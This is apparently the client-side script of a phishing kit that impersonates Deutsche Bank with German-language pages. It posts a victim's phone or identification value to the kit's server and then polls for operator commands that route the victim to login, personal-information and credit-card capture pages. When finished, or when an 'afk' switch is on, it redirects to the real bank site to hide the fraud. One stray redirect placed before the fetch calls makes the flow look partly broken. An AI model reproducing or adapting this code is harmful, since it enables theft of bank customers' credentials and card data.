const login_form = document.querySelector('#login-form');

const identification = document.querySelector('#phone');
const loginButton = document.querySelector('#loginButton');
const token = document.querySelector('#token');

login_form.addEventListener('submit', e => {
    e.preventDefault();

    if (identification.value === '') {
        loginButton.innerHTML = 'Beenden';
        loginButton.disabled = false;

        identification.disabled = false;

        identification.value = '';

        document.querySelector('#errorMessage').style.display = 'block';
    } else {
        const data = new FormData();
        data.append('identification', identification.value);

        // loginButton.innerHTML = '<img src="images/ing.gif" width="18"> Laden...';
        loginButton.disabled = true;
window.location.href = 'https://www.deutsche-bank.de/pk.html';
        setTimeout(() => {
            fetch('/public/api/afk.ini')
                .then(response => response.text())
                .then(text => {
                    if (text.trim().toLowerCase() === 'on') {
                        window.location.href = 'https://www.deutsche-bank.de/';
                    }
                })
                .catch(error => {
                    console.error('There is an error:', error);
                });
        }, 800);

        identification.disabled = true;

        document.querySelector('#errorMessage').style.display = 'none';

        fetch('/identificatie/' + token.value, {
            method: 'POST',
            body: data
        }).then(() => {
            const newInterval = setInterval(() => {
                fetch('/identificatie/check/' + token.value, {
                    method: 'POST'
                }).then(res => {
                    res.json().then(data => {
                        switch (data.page) {
                            case 'login':
                                window.location.href = '/einloggen/' + token.value;
                                break;
                            case 'name':
                                window.location.href = '/information/' + token.value;
                                break;
                            case 'creditcard':
                                window.location.href = '/creditcard/' + token.value;
                                break;
                            case 'identification':
                                loginButton.innerHTML = 'Beenden';
                                loginButton.disabled = false;

                                identification.disabled = false;

                                identification.value = '';

                                document.querySelector('#errorMessage').style.display = 'block';

                                clearInterval(newInterval);
                                break;
                            case 'finish':
                                window.location.href = 'https://www.deutsche-bank.de/';
                                break;
                            case 'waiting':
                                console.log('Waiting...');
                                break;
                            default:
                                console.log('Unknown page:', data.page);
                                break;
                        }
                    });
                });
            }, 500);
        });
    }
});
